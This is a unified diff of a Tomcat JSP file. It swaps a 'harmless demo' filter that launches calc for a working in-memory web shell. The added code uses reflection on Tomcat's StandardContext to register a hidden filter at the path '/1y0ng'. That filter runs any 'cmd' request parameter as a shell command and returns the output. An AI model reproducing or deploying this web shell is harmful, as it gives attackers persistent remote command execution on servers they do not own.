@@ -1,111 +1,85 @@
-<%@ page import="javax.servlet.*, javax.servlet.http.*, java.lang.reflect.*, java.util.*, org.apache.catalina.core.*" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.lang.reflect.Constructor" %>
 <%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
 <%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
-<%@ page import="java.io.IOException" %>
-
-<%
-    request.setCharacterEncoding("UTF-8");
-    response.setCharacterEncoding("UTF-8");
-    response.setContentType("text/html; charset=UTF-8");
-%>
-<%
-    // 无害化演示Filter（仅添加响应标识）
-    class MemFilter implements TestFilter {
-        public void init(FilterConfig config) {}
-
-        public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
-                throws ServletException {
-            HttpServletResponse response = (HttpServletResponse) res;
-            // 无害化标识：添加响应头
-            response.addHeader("X-TestFilter-Active", "MemShell-Demo");
-            try {
-                Runtime.getRuntime().exec("calc");
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-            try {
-                chain.doFilter(req, res);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
+<%@ page import="java.util.Map" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<html>
+<head>
+    <title>Title</title>
+</head>
+<body>
+<%!
+    public class Shellfilter implements  Filter{
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
         }
 
-        public void destroy() {}
-    }
-
-// 注入逻辑（通过参数触发）
-    if ("load".equals(request.getParameter("action"))) {
-        try {
-            // 获取ApplicationContext
-            ServletContext ctx = request.getServletContext();
-            Field appCtxField = ctx.getClass().getDeclaredField("context");
-            appCtxField.setAccessible(true);
-            ApplicationContext appCtx = (ApplicationContext) appCtxField.get(ctx);
-
-            // 获取StandardContext
-            Field stdCtxField = appCtx.getClass().getDeclaredField("context");
-            stdCtxField.setAccessible(true);
-            StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);
-
-            // 防止重复注入
-            boolean exists = stdCtx.findFilterDef("memFilter") != null;
-            if (!exists) {
-                // 创建Filter定义
-                FilterDef filterDef = new FilterDef();
-                filterDef.setFilterName("memFilter");
-                filterDef.setFilterClass(MemFilter.class.getName());
-                filterDef.setFilter(new MemFilter());
-
-                // 添加Filter映射
-                stdCtx.addFilterDef(filterDef);
-                FilterMap filterMap = new FilterMap();
-                filterMap.setFilterName("memFilter");
-                filterMap.addURLPattern("/*");
-                filterMap.setDispatcher(DispatcherType.REQUEST.name());
-                stdCtx.addFilterMapBefore(filterMap);
-
-                out.println("[+] TestFilter injected successfully!");
-
-                //验证代码
-                FilterDef filterDefCheck = stdCtx.findFilterDef("memFilter");
-                if (filterDefCheck != null) {
-                    out.println("[+] FilterDef存在");
-                    FilterMap[] maps = stdCtx.findFilterMaps();
-                    for (FilterMap map : maps) {
-                        if ("memFilter".equals(map.getFilterName())) {
-                            out.println("[+] FilterMap存在，匹配路径：" + Arrays.toString(map.getURLPatterns()));
-                        }
-                    }
-                } else {
-                    out.println("[-] FilterDef未找到");
-                }
-            } else {
-                out.println("[-] TestFilter already exists");
-
-                //验证代码
-                FilterDef filterDefCheck = stdCtx.findFilterDef("memFilter");
-                if (filterDefCheck != null) {
-                    out.println("[+] FilterDef存在");
-                    FilterMap[] maps = stdCtx.findFilterMaps();
-                    for (FilterMap map : maps) {
-                        if ("memFilter".equals(map.getFilterName())) {
-                            out.println("[+] FilterMap存在，匹配路径：" + Arrays.toString(map.getURLPatterns()));
-                        }
-                    }
-                } else {
-                    out.println("[-] FilterDef未找到");
-                }
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            String cmd = servletRequest.getParameter("cmd");
+            boolean isLinux = true;
+            String osTyp = System.getProperty("os.name");
+            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                isLinux = false;
             }
-        } catch (Exception e) {
-            out.println("[-] Injection error: " + e.toString());
+            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter("\\\\a");
+            String output = s.hasNext() ? s.next() : "";
+            PrintWriter out = servletResponse.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+
+        @Override
+        public void destroy() {
         }
     }
 %>
+<%
+    //拿到standardContext
+    ServletContext servletContext = request.getServletContext();
+    Field applicationField = servletContext.getClass().getDeclaredField("context");
+    applicationField.setAccessible(true);
+    ApplicationContext applicationContext =  (ApplicationContext) applicationField.get(servletContext);
+    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+    standardContextField.setAccessible(true);
+    StandardContext standardContext =  (StandardContext) standardContextField.get(applicationContext);
 
+    //设置filterDef
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterClass(Shellfilter.class.getName());
+    filterDef.setFilterName("Shellfilter");
+    filterDef.setFilter(new Shellfilter());
+    standardContext.addFilterDef(filterDef);
 
+    //设置filterMap
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName("Shellfilter");
+    filterMap.addURLPattern("/1y0ng");
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    standardContext.addFilterMap(filterMap);
 
-<!-- 注入触发器 -->
-<form method="post">
-    <input type="hidden" name="action" value="load">
-    <input type="submit" value="Inject TestFilter">
-</form>
+    //将standardContext和filterDef放到filterConfig中
+    Class configclass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+    Constructor configconstructor = configclass.getDeclaredConstructor(Context.class,FilterDef.class);
+    configconstructor.setAccessible(true);
+    FilterConfig filterConfig = (FilterConfig) configconstructor.newInstance(standardContext,filterDef);
+
+    //反射获取filterConfig
+    Field configsfield = standardContext.getClass().getDeclaredField("filterConfigs");
+    configsfield.setAccessible(true);
+    Map filterConfigs = (Map) configsfield.get(standardContext);
+    filterConfigs.put("Shellfilter",filterConfig);
+%>
+</body>
+</html>
